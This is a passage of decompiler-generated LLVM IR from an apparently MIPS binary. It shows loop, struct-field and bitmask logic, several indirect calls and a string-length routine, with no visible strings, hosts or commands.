  %v0_403e78 = load i32, i32* %v0.global-to-local, align 4
  %v1_403e78 = icmp eq i32 %v0_403e78, 0
  store i32 %v0_403e78, i32* %a0.global-to-local, align 4
  br i1 %v1_403e78, label %dec_label_pc_403e7c, label %dec_label_pc_403f20

dec_label_pc_403e7c:                              ; preds = %dec_label_pc_403e4c
  %v0_403e80 = load i32, i32* %s2.global-to-local, align 4
  %v1_403e80 = add i32 %v0_403e80, 16
  %v2_403e80 = inttoptr i32 %v1_403e80 to i8*
  %v3_403e80 = load i8, i8* %v2_403e80, align 1
  %v4_403e80 = zext i8 %v3_403e80 to i32
  store i32 %v4_403e80, i32* %v1.global-to-local, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_403e88 = icmp eq i8 %v3_403e80, 4
  store i32 0, i32* %a1.global-to-local, align 4
  br i1 %v2_403e88, label %dec_label_pc_403e8c, label %dec_label_pc_403ecc

dec_label_pc_403e8c:                              ; preds = %dec_label_pc_403e7c
  %v3_403e90 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403e98 = add i32 %v3_403e90, 12276
  store i32 %v0_403e80, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403e98)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403eac = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403eb4 = add i32 %v3_403eac, 12404
  %v1_403eb8 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_403eb8, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403eb4)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v0_403ed0.pr = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403ecc

dec_label_pc_403ecc:                              ; preds = %dec_label_pc_403e7c, %dec_label_pc_403e8c
  %v0_403ed0 = phi i32 [ %v4_403e80, %dec_label_pc_403e7c ], [ %v0_403ed0.pr, %dec_label_pc_403e8c ]
  %v2_403ed0 = icmp eq i32 %v0_403ed0, 5
  store i32 131, i32* %v0.global-to-local, align 4
  br i1 %v2_403ed0, label %dec_label_pc_403ed4, label %dec_label_pc_403f18

dec_label_pc_403ed4:                              ; preds = %dec_label_pc_403ecc
  %v3_403ed8 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403ee0 = add i32 %v3_403ed8, 12276
  %v1_403ee4 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_403ee4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403ee0)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403ef4 = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403efc = add i32 %v3_403ef4, 12404
  %v1_403f00 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_403f00, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403efc)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 2, i32* %v0.global-to-local, align 4
  %v2_403f14 = load i32, i32* %s2.global-to-local, align 4
  %v3_403f14 = add i32 %v2_403f14, 17
  %v4_403f14 = inttoptr i32 %v3_403f14 to i8*
  store i8 2, i8* %v4_403f14, align 1
  %v0_403f1c.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403f18

dec_label_pc_403f18:                              ; preds = %dec_label_pc_403ecc, %dec_label_pc_403ed4
  %v0_403f1c = phi i32 [ 131, %dec_label_pc_403ecc ], [ %v0_403f1c.pre, %dec_label_pc_403ed4 ]
  %v1_403f1c = load i32, i32* %s3.global-to-local, align 4
  %v2_403f1c = inttoptr i32 %v1_403f1c to i32*
  store i32 %v0_403f1c, i32* %v2_403f1c, align 4
  %v0_403f24.pr = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403f20

dec_label_pc_403f20:                              ; preds = %dec_label_pc_403e4c, %dec_label_pc_403f18
  %v0_403f24 = phi i32 [ %v0_403e78, %dec_label_pc_403e4c ], [ %v0_403f24.pr, %dec_label_pc_403f18 ]
  %v2_403f24 = icmp eq i32 %v0_403f24, -1
  store i32 11, i32* %v0.global-to-local, align 4
  br i1 %v2_403f24, label %dec_label_pc_403f28, label %dec_label_pc_403f20.dec_label_pc_403f5c_crit_edge

dec_label_pc_403f20.dec_label_pc_403f5c_crit_edge: ; preds = %dec_label_pc_403f20
  %v0_403f5c.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403f5c

dec_label_pc_403f28:                              ; preds = %dec_label_pc_403f20
  %v0_403f2c = load i32, i32* %s3.global-to-local, align 4
  %v1_403f2c = inttoptr i32 %v0_403f2c to i32*
  %v2_403f2c = load i32, i32* %v1_403f2c, align 4
  store i32 %v2_403f2c, i32* %v1.global-to-local, align 4
  %v2_403f34 = icmp eq i32 %v2_403f2c, 11
  br i1 %v2_403f34, label %dec_label_pc_403f78, label %dec_label_pc_403f28.dec_label_pc_403f3c_crit_edge

dec_label_pc_403f28.dec_label_pc_403f3c_crit_edge: ; preds = %dec_label_pc_403f28
  %v0_403f3c.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403f3c

dec_label_pc_403f3c:                              ; preds = %dec_label_pc_403f28.dec_label_pc_403f3c_crit_edge, %dec_label_pc_403a90
  %v0_403f3c = phi i32 [ %v0_403f3c.pre, %dec_label_pc_403f28.dec_label_pc_403f3c_crit_edge ], [ %v2_403164, %dec_label_pc_403a90 ]
  %v1_403f3c = add i32 %v0_403f3c, -32736
  %v2_403f3c = inttoptr i32 %v1_403f3c to i32*
  %v3_403f3c = load i32, i32* %v2_403f3c, align 4
  %v0_403f40 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403f40, i32* %a0.global-to-local, align 4
  %v1_403f44 = add i32 %v3_403f3c, 12276
  store i32 0, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403f44)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403f68.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403f5c

dec_label_pc_403f5c:                              ; preds = %dec_label_pc_403f20.dec_label_pc_403f5c_crit_edge, %dec_label_pc_403f3c
  %v0_403f68 = phi i32 [ %v0_403f24, %dec_label_pc_403f20.dec_label_pc_403f5c_crit_edge ], [ %v0_403f68.pre, %dec_label_pc_403f3c ]
  %v0_403f5c = phi i32 [ %v0_403f5c.pre, %dec_label_pc_403f20.dec_label_pc_403f5c_crit_edge ], [ %v2_403164, %dec_label_pc_403f3c ]
  %v1_403f5c = add i32 %v0_403f5c, -32020
  %v2_403f5c = inttoptr i32 %v1_403f5c to i32*
  %v3_403f5c = load i32, i32* %v2_403f5c, align 4
  store i32 %v3_403f5c, i32* %v1.global-to-local, align 4
  %v0_403f60 = load i32, i32* %s2.global-to-local, align 4
  %v1_403f60 = add i32 %v0_403f60, 530
  %v2_403f60 = inttoptr i32 %v1_403f60 to i16*
  %v3_403f60 = load i16, i16* %v2_403f60, align 2
  %v4_403f60 = zext i16 %v3_403f60 to i32
  store i32 %v4_403f60, i32* %v0.global-to-local, align 4
  %v1_403f64 = inttoptr i32 %v3_403f5c to i32*
  %v2_403f64 = load i32, i32* %v1_403f64, align 4
  store i32 %v2_403f64, i32* %v1.global-to-local, align 4
  %v2_403f68 = add i32 %v4_403f60, %v0_403f68
  store i32 %v2_403f68, i32* %v0.global-to-local, align 4
  %v1_403f6c = trunc i32 %v2_403f68 to i16
  store i16 %v1_403f6c, i16* %v2_403f60, align 2
  %v0_403f74 = load i32, i32* %v1.global-to-local, align 4
  %v1_403f74 = load i32, i32* %s2.global-to-local, align 4
  %v2_403f74 = add i32 %v1_403f74, 532
  %v3_403f74 = inttoptr i32 %v2_403f74 to i32*
  store i32 %v0_403f74, i32* %v3_403f74, align 4
  br label %dec_label_pc_403f78

dec_label_pc_403f78:                              ; preds = %dec_label_pc_403f28, %dec_label_pc_403e3c, %dec_label_pc_403e14, %dec_label_pc_403a4c, %dec_label_pc_403f5c
  %v3_403f78 = load i32, i32* %stack_var_-2928, align 4
  %v1_403f80 = add i32 %v3_403f78, 1
  store i32 %v1_403f80, i32* %a0.global-to-local, align 4
  %v1_403f84 = icmp slt i32 %v1_403f80, 160
  %v2_403f84 = zext i1 %v1_403f84 to i32
  store i32 %v2_403f84, i32* %v0.global-to-local, align 4
  store i32 %v1_403f80, i32* %stack_var_-2928, align 4
  br i1 %v1_403f84, label %dec_label_pc_403a4c, label %dec_label_pc_403f98

dec_label_pc_403f98:                              ; preds = %dec_label_pc_403f78, %dec_label_pc_4031b8, %dec_label_pc_40315c
  store i32 %v0_40316c, i32* @ra, align 4
  store i32 %v0_403170, i32* @fp, align 4
  store i32 %v0_403174, i32* @s7, align 4
  store i32 %v0_403178, i32* @s6, align 4
  store i32 %v0_403180, i32* @s4, align 4
  store i32 %v0_403190, i32* @s0, align 4
  %v4_403fc0 = load i32, i32* %v0.global-to-local, align 4
  ret i32 %v4_403fc0

; uselistorder directives
  uselistorder i32 %v1_403f80, { 1, 2, 3, 0 }
  uselistorder i32 %v1_403e34, { 1, 0 }
  uselistorder i32 %v3_403e14, { 1, 0, 2 }
  uselistorder i32 %v4_403db0, { 1, 0, 2 }
  uselistorder i32 %v4_403d20, { 1, 0, 2 }
  uselistorder i32 %v4_403c54, { 1, 0, 2 }
  uselistorder i32 %v4_403b54, { 1, 0, 2 }
  uselistorder i32 %v3_403a64, { 1, 0, 2, 3 }
  uselistorder i32 %v1_403a58, { 1, 0 }
  uselistorder i8* %v7_403b20, { 1, 0, 5, 4, 3, 2, 6, 7 }
  uselistorder i32 %v1_4039d4, { 1, 2, 3, 0 }
  uselistorder i32 %stack_var_-56.1, { 0, 2, 1, 3 }
  uselistorder i32 %v4_403974, { 2, 1, 0 }
  uselistorder i32 %v1_403970, { 2, 0, 1 }
  uselistorder i32 %v1_403990, { 2, 3, 1, 0 }
  uselistorder i32 %stack_var_-56.0, { 3, 4, 5, 1, 0, 2 }
  uselistorder i32 %v1_403874, { 1, 0 }
  uselistorder i32 %v2_40396c, { 1, 0, 2 }
  uselistorder i32 %v1_403854, { 1, 2, 0 }
  uselistorder i32 %v2_40384c, { 0, 2, 1, 4, 3, 5, 7, 6, 8, 9, 11, 10, 12, 13, 15, 14, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 29, 30 }
  uselistorder i32 %v1_403840, { 0, 2, 3, 1 }
  uselistorder i32 %v2_403834, { 1, 0, 2 }
  uselistorder i32 %v0_403710, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_403650, { 1, 0, 2 }
  uselistorder i32 %v4_4035f8.pre-phi, { 1, 0 }
  uselistorder i32 %v4_4035e8, { 2, 1, 0 }
  uselistorder i32 %v0_4035e8, { 0, 2, 1 }
  uselistorder i32 %v1_4035c4, { 1, 0 }
  uselistorder i32 %v2_4034dc, { 1, 0, 2 }
  uselistorder i32 %v4_403490, { 1, 0 }
  uselistorder i32 %v2_40341c, { 1, 0 }
  uselistorder i32 %v1_403418, { 1, 0 }
  uselistorder i32 %v0_403400, { 1, 0 }
  uselistorder i32 %v0_403368, { 1, 0, 2 }
  uselistorder i32 %v3_403200, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_403164, { 0, 28, 1, 27, 26, 25, 24, 23, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 22, 21, 63, 62, 61, 2, 60, 59, 20, 19, 71, 70, 69, 68, 67, 66, 65, 64, 18, 17, 16, 73, 72, 15, 14, 13, 12, 11, 3, 77, 76, 75, 74, 10, 9, 8, 7, 6, 5, 4, 78 }
  uselistorder i32* %stack_var_-2892, { 0, 2, 3, 1, 4 }
  uselistorder i32* %stack_var_-2928, { 1, 2, 3, 4, 5, 14, 6, 7, 8, 9, 10, 11, 0, 15, 12, 13 }
  uselistorder i32* %stack_var_-2596, { 4, 3, 2, 0, 1, 5 }
  uselistorder i32* %stack_var_-2916, { 1, 0 }
  uselistorder i32* %v1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 40, 41, 42, 37, 38, 39 }
  uselistorder i32* %v0.global-to-local, { 95, 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 45, 38, 39, 40, 43, 41, 42, 44, 70, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 73, 72, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 108, 110, 91, 92, 93, 94, 97, 96 }
  uselistorder i32* %s1.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32* %gp.global-to-local, { 0, 5, 6, 1, 2, 3, 4, 7, 38, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 69, 70, 71, 72, 73, 74, 75, 80, 76, 77, 78, 79, 81, 62, 63, 64, 65, 66, 67, 68 }
  uselistorder i32* %a2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 13 }
  uselistorder i32* %a1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 26, 27, 22, 23, 24, 25, 28, 29, 30, 31, 35, 36, 37, 38, 32, 33, 34 }
  uselistorder i32* %a0.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 69, 70, 71, 72, 73, 75, 74, 76, 77, 78, 79, 80, 81, 82, 65, 66, 68, 67, 0 }
  uselistorder i32 (i32)* @function_404200, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([195 x i8]* @global_var_4084cc.267 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 (i32, i32, i32)* @function_4042e8, { 4, 3, 2, 1, 0 }
  uselistorder i32 1024, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32)* @function_400c78, { 3, 2, 1, 0 }
  uselistorder i32 21, { 1, 8, 2, 9, 3, 10, 11, 4, 12, 5, 13, 6, 14, 7, 15, 0, 16 }
  uselistorder i32 4103, { 1, 0, 2 }
  uselistorder i32 65535, { 6, 2, 7, 0, 3, 8, 1, 9, 4, 5 }
  uselistorder i32 17, { 2, 3, 4, 5, 6, 0, 7, 1, 8 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 11, { 1, 6, 3, 4, 7, 0, 8, 9, 2, 10, 5, 11 }
  uselistorder i32 16384, { 12, 0, 13, 1, 14, 2, 15, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 24, 11, 25 }
  uselistorder i32 (i32)* @function_406440, { 1, 3, 2, 0 }
  uselistorder i32 (i32)* @function_400dc0, { 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32 (i32)* @function_400f0c, { 0, 3, 2, 1 }
  uselistorder i32 27, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32 536, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 ()* @function_4029cc, { 1, 0 }
  uselistorder i32 ()* @function_404a30, { 2, 1, 0 }
  uselistorder i32* @s6, { 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32* @s7, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_403f78, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_403f5c, { 1, 0 }
  uselistorder label %dec_label_pc_403f20, { 1, 0 }
  uselistorder label %dec_label_pc_403f18, { 1, 0 }
  uselistorder label %dec_label_pc_403ecc, { 1, 0 }
  uselistorder label %dec_label_pc_403e14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_403d6c, { 1, 0 }
  uselistorder label %dec_label_pc_403ca4, { 1, 0 }
  uselistorder label %dec_label_pc_403ba4, { 1, 0 }
  uselistorder label %dec_label_pc_403a00, { 1, 0 }
  uselistorder label %dec_label_pc_4039a4, { 1, 0 }
  uselistorder label %dec_label_pc_40396c, { 1, 0 }
  uselistorder label %dec_label_pc_403954, { 1, 0 }
  uselistorder label %dec_label_pc_403908, { 1, 0 }
  uselistorder label %dec_label_pc_4035f8, { 1, 0 }
  uselistorder label %dec_label_pc_4033b8, { 1, 0 }
  uselistorder label %dec_label_pc_403360, { 1, 0 }
  uselistorder label %dec_label_pc_4032f0, { 1, 0 }
  uselistorder label %dec_label_pc_4032e0, { 0, 2, 1 }
}

define i32 @function_403fc8() local_unnamed_addr {
dec_label_pc_403fc8:
  %v3_403fd4 = load i32, i32* bitcast (i32** @global_var_44941c.280 to i32*), align 4
  %v3_403fd8 = load i32, i32* @global_var_4493e4.7, align 4
  store i32 %v3_403fd8, i32* @t9, align 4
  %v3_403fe0 = call i32 @function_404b50(i32 %v3_403fd4, i32 9)
  ret i32 %v3_403fe0
}

define i32 @function_403fe8(i32 %arg1) local_unnamed_addr {
dec_label_pc_403fe8:
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp11 = alloca i32, align 4
  %tmp12 = alloca i32, align 4
  %tmp13 = alloca i32, align 4
  %tmp14 = alloca i32, align 4
  %v1_403ff0 = load i32, i32* @t9, align 4
  %v2_403ff0 = add i32 %v1_403ff0, 315880
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v0_404004 = load i32, i32* @s0, align 4
  %v3_40400c = load i32, i32* @global_var_449380.4, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40400c)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v0_404020 = load i32, i32* @v0, align 4
  store i32 %v0_404020, i32* %v1.global-to-local, align 4
  %v3_404024 = load i32, i32* bitcast (i32** @global_var_44941c.280 to i32*), align 4
  %v2_40402c = inttoptr i32 %v3_404024 to i32*
  store i32 %v0_404020, i32* %v2_40402c, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_404034 = load i32, i32* %v1.global-to-local, align 4
  %v2_404034 = icmp eq i32 %v0_404034, -1
  %v1_40403c = icmp sgt i32 %v0_404034, 0
  %or.cond = or i1 %v2_404034, %v1_40403c
  br i1 %or.cond, label %dec_label_pc_4041e8, label %dec_label_pc_404040

dec_label_pc_404040:                              ; preds = %dec_label_pc_403fe8
  %v3_404044 = load i32, i32* @global_var_4493a8.167, align 4
  call void @__pseudo_call(i32 %v3_404044)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v2_40405c = ptrtoint i32* %tmp11 to i32
  %v2_404064 = ptrtoint i32* %tmp12 to i32
  %v2_40413c = ptrtoint i32* %tmp13 to i32
  %v2_4040b4 = ptrtoint i32* %tmp14 to i32
  br label %dec_label_pc_404058

dec_label_pc_404058:                              ; preds = %dec_label_pc_404084, %dec_label_pc_404040
  store i32 16, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40405c

dec_label_pc_40405c:                              ; preds = %dec_label_pc_404138, %dec_label_pc_404058
  store i32 16, i32* %tmp13, align 4
  store i32 %v2_404064, i32* %v1.global-to-local, align 4
  store i32 %v2_40405c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_40406c

dec_label_pc_40406c:                              ; preds = %dec_label_pc_40406c, %dec_label_pc_40405c
  %v0_40406c = phi i32 [ %v1_404070, %dec_label_pc_40406c ], [ %v2_40405c, %dec_label_pc_40405c ]
  %v1_40406c = inttoptr i32 %v0_40406c to i32*
  store i32 0, i32* %v1_40406c, align 4
  %v0_404070 = load i32, i32* %v0.global-to-local, align 4
  %v1_404070 = add i32 %v0_404070, 4
  store i32 %v1_404070, i32* %v0.global-to-local, align 4
  %v1_404074 = load i32, i32* %v1.global-to-local, align 4
  %v2_404074 = icmp eq i32 %v1_404070, %v1_404074
  br i1 %v2_404074, label %dec_label_pc_404078, label %dec_label_pc_40406c

dec_label_pc_404078:                              ; preds = %dec_label_pc_40406c
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_404080 = load i32, i32* %s2.global-to-local, align 4
  %v2_404080 = icmp eq i32 %v0_404080, -1
  %v4_404080 = udiv i32 %v0_404080, 32
  store i32 %v4_404080, i32* %s1.global-to-local, align 4
  br i1 %v2_404080, label %dec_label_pc_404078.dec_label_pc_4040e8_crit_edge, label %dec_label_pc_404084

dec_label_pc_404078.dec_label_pc_4040e8_crit_edge: ; preds = %dec_label_pc_404078
  %v0_4040e8.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4040e8

dec_label_pc_404084:                              ; preds = %dec_label_pc_404078
  store i32 %v2_40413c, i32* %v0.global-to-local, align 4
  %v1_40408c = mul nuw nsw i32 %v4_404080, 4
  %v2_404090 = add i32 %v1_40408c, %v2_40413c
  %v1_404094 = add i32 %v2_404090, 28
  %v2_404094 = inttoptr i32 %v1_404094 to i32*
  %v3_404094 = load i32, i32* %v2_404094, align 4
  %v1_404098 = urem i32 %v0_404080, 32
  store i32 %v1_404098, i32* @s0, align 4
  %v2_4040a0 = shl i32 1, %v1_404098
  %v2_4040a4 = or i32 %v3_404094, %v2_4040a0
  store i32 %v2_4040a4, i32* %v1.global-to-local, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  %v0_4040ac = load i32, i32* %gp.global-to-local, align 4
  %v1_4040ac = add i32 %v0_4040ac, -32144
  %v2_4040ac = inttoptr i32 %v1_4040ac to i32*
  %v3_4040ac = load i32, i32* %v2_4040ac, align 4
  store i32 10, i32* %tmp14, align 4
  store i32 %v2_4040b4, i32* %v0.global-to-local, align 4
  store i32 %v2_4040a4, i32* %v2_404094, align 4
  store i32 0, i32* @a2, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_4040ac)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v0_4040d8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4040d8 = icmp eq i32 %v0_4040d8, 0
  store i32 %v2_4040b4, i32* %v1.global-to-local, align 4
  br i1 %v1_4040d8, label %dec_label_pc_404058, label %dec_label_pc_4040dc

dec_label_pc_4040dc:                              ; preds = %dec_label_pc_404084
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4040e8

dec_label_pc_4040e8:                              ; preds = %dec_label_pc_404078.dec_label_pc_4040e8_crit_edge, %dec_label_pc_4040dc
  %v0_4040e8 = phi i32 [ %v0_4040e8.pre, %dec_label_pc_404078.dec_label_pc_4040e8_crit_edge ], [ %v2_403ff0, %dec_label_pc_4040dc ]
  %v1_4040e8 = add i32 %v0_4040e8, -32188
  %v2_4040e8 = inttoptr i32 %v1_4040e8 to i32*
  %v3_4040e8 = load i32, i32* %v2_4040e8, align 4
  call void @__pseudo_call(i32 %v3_4040e8)
  %v0_404100 = load i32, i32* %v0.global-to-local, align 4
  %v2_404100 = zext i32 %v0_404100 to i64
  %v4_404100 = mul nuw i64 %v2_404100, 3435973837
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v3_40410c = load i32, i32* @global_var_449454.5, align 4
  %v1_4041141 = udiv i64 %v4_404100, 17179869184
  %v1_404114 = trunc i64 %v1_4041141 to i32
  store i32 %v1_404114, i32* %v1.global-to-local, align 4
  %v1_4041183 = mul nuw nsw i64 %v1_4041141, 4
  %v1_404118 = trunc i64 %v1_4041183 to i32
  %v2_40411c.neg = sub i32 %v0_404100, %v1_404114
  %v2_404120 = sub i32 %v2_40411c.neg, %v1_404118
  store i32 %v2_404120, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40410c)
  %v0_404134 = load i32, i32* %v1.global-to-local, align 4
  %v2_404134 = icmp eq i32 %v0_404134, %v2_404120
  %v3_404134 = load i32, i32* %s1.global-to-local, align 4
  %v4_404134 = mul i32 %v3_404134, 4
  store i32 %v4_404134, i32* %v0.global-to-local, align 4
  br i1 %v2_404134, label %dec_label_pc_4041d8, label %dec_label_pc_404138

dec_label_pc_404138:                              ; preds = %dec_label_pc_4040e8
  store i32 %v2_40413c, i32* @a2, align 4
  %v2_404140 = add i32 %v4_404134, %v2_40413c
  store i32 %v2_404140, i32* %v0.global-to-local, align 4
  %v1_404144 = add i32 %v2_404140, 28
  %v2_404144 = inttoptr i32 %v1_404144 to i32*
  %v3_404144 = load i32, i32* %v2_404144, align 4
  %v1_40414c = load i32, i32* @s0, align 4
  %tmp17 = shl i32 1, %v1_40414c
  %v1_4041506 = and i32 %tmp17, %v3_404144
  %v1_404154 = icmp eq i32 %v1_4041506, 0
  store i32 16, i32* %v0.global-to-local, align 4
  br i1 %v1_404154, label %dec_label_pc_40405c, label %dec_label_pc_404158

dec_label_pc_404158:                              ; preds = %dec_label_pc_404138
  %v3_40415c = load i32, i32* @global_var_449408.286, align 4
  call void @__pseudo_call(i32 %v3_40415c)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v3_404174 = load i32, i32* bitcast (i32** @global_var_44930c.288 to i32*), align 4
  call void @__pseudo_call(i32 %v3_404174)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v3_40418c = load i32, i32* @global_var_4493b8.290, align 4
  call void @__pseudo_call(i32 %v3_40418c)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v3_4041a4 = load i32, i32* @global_var_4492b8.292, align 4
  call void @__pseudo_call(i32 %v3_4041a4)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  %v3_4041bc = load i32, i32* @global_var_4492f8, align 4
  store i32 %v3_4041bc, i32* %v0.global-to-local, align 4
  %v3_4041c0 = load i32, i32* @global_var_4493e4.7, align 4
  call void @__pseudo_call(i32 %v3_4041c0)
  store i32 %v2_403ff0, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_4041d8

dec_label_pc_4041d8:                              ; preds = %dec_label_pc_4040e8, %dec_label_pc_404158
  %v3_4041d8 = load i32, i32* @global_var_4492dc.8, align 4
  call void @__pseudo_call(i32 %v3_4041d8)
  %v4_4041f8.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4041e8

dec_label_pc_4041e8:                              ; preds = %dec_label_pc_403fe8, %dec_label_pc_4041d8
  %v4_4041f8 = phi i32 [ -1, %dec_label_pc_403fe8 ], [ %v4_4041f8.pre, %dec_label_pc_4041d8 ]
  store i32 %v0_404004, i32* @s0, align 4
  ret i32 %v4_4041f8

; uselistorder directives
  uselistorder i32 %v4_404134, { 1, 0 }
  uselistorder i32 %v1_404098, { 1, 0 }
  uselistorder i32 %v1_404070, { 1, 2, 0 }
  uselistorder i32 %v2_40413c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_403ff0, { 9, 7, 8, 5, 6, 4, 0, 3, 2, 1, 10 }
  uselistorder i32* %tmp14, { 1, 0 }
  uselistorder i32* %tmp13, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 2, 0, 4, 1, 3, 5, 11, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder label %dec_label_pc_4041e8, { 1, 0 }
  uselistorder label %dec_label_pc_4041d8, { 1, 0 }
  uselistorder label %dec_label_pc_4040e8, { 1, 0 }
}

define i32 @function_404200(i32 %arg1) local_unnamed_addr {
dec_label_pc_404200:
  %v0_404200 = load i32, i32* @v0, align 4
  ret i32 %v0_404200
}

define i32 @function_404204() local_unnamed_addr {
dec_label_pc_404204:
  %v0_40420c.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_404208

dec_label_pc_404208:                              ; preds = %dec_label_pc_404208, %dec_label_pc_404204
  %v0_40420c = phi i32 [ %v3_404214, %dec_label_pc_404208 ], [ %v0_40420c.pre, %dec_label_pc_404204 ]
  %v0_404208 = phi i32 [ %v1_404208, %dec_label_pc_404208 ], [ 0, %dec_label_pc_404204 ]
  %v1_404208 = add i32 %v0_404208, 1
  %v1_40420c = inttoptr i32 %v0_40420c to i8*
  %v2_40420c = load i8, i8* %v1_40420c, align 1
  %v1_404214 = icmp eq i8 %v2_40420c, 0
  %v3_404214 = add i32 %v0_40420c, 1
  br i1 %v1_404214, label %dec_label_pc_404218, label %dec_label_pc_404208

